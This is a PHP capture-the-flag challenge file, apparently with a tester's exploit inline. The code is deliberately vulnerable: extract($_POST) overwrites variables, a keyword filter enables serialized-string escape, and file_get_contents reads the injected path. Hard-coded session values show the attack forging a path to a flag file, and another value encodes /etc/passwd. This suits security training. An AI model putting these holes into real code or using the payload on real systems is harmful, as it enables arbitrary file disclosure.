<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'flagflag';
$_SESSION['function'] = '";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}';
$_SESSION['img'] = "L2V0Yy9wYXNzd2Q=";

var_dump(serialize($_SESSION));

extract($_POST);

$serialize_info = filter(serialize($_SESSION));
var_dump($serialize_info);

//if(!$function){
//    echo '<a href="index.php?f=highlight_file">source_code</a>';
//}
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}